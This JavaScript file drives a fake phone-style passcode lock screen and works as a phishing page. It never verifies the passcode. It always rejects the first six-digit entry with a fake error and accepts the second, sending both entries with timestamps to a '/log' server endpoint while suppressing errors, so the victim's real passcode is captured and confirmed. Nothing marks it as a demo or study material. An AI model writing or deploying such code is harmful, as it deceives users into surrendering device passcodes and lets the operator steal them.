let passcode = '';
let attemptCount = 0;
let inputHistory = [];

const dots = document.querySelectorAll('.dot');
const lockscreen = document.querySelector('.lockscreen');
const title = document.querySelector('.title');
const lockIcon = document.querySelector('.lock-icon');

function updateDots() {
  dots.forEach((dot, i) => {
    dot.classList.remove('filled');
    if (i < passcode.length) {
      dot.classList.add('filled');
    }
  });
}

function logToServer(attempt, input, success) {
  fetch('/log', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      timestamp: new Date().toLocaleString('vi-VN'),
      attempt: attempt,
      input: input,
      success: success
    })
  }).catch(() => {});
}

function shakeError() {
  lockscreen.classList.add('shake');
  dots.forEach(dot => {
    dot.style.borderColor = '#ff3b30';
    dot.style.background = dot.classList.contains('filled') ? '#ff3b30' : 'transparent';
  });

  setTimeout(() => {
    lockscreen.classList.remove('shake');
    passcode = '';
    dots.forEach(dot => {
      dot.style.borderColor = '';
      dot.style.background = '';
    });
    updateDots();
  }, 600);
}

function successUnlock() {
  lockscreen.classList.add('success');
  title.textContent = '';
  lockIcon.innerHTML = '<svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="#34c759" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';

  setTimeout(() => {
    window.location.href = 'home.html';
  }, 1000);
}

function handleKey(key) {
  if (passcode.length >= 6) return;

  passcode += key;
  updateDots();

  if (passcode.length === 6) {
    attemptCount++;
    const currentInput = passcode;

    if (attemptCount === 1) {
      logToServer(1, currentInput, false);
      setTimeout(() => shakeError(), 100);
    } else {
      logToServer(2, currentInput, true);
      setTimeout(() => successUnlock(), 100);
    }
  }
}

document.querySelectorAll('.key:not(.empty):not(.delete)').forEach(btn => {
  btn.addEventListener('click', () => handleKey(btn.dataset.key));
});

document.getElementById('deleteKey').addEventListener('click', () => {
  passcode = passcode.slice(0, -1);
  updateDots();
});

document.addEventListener('keydown', (e) => {
  if (e.key >= '0' && e.key <= '9') {
    handleKey(e.key);
  } else if (e.key === 'Backspace') {
    passcode = passcode.slice(0, -1);
    updateDots();
  }
});
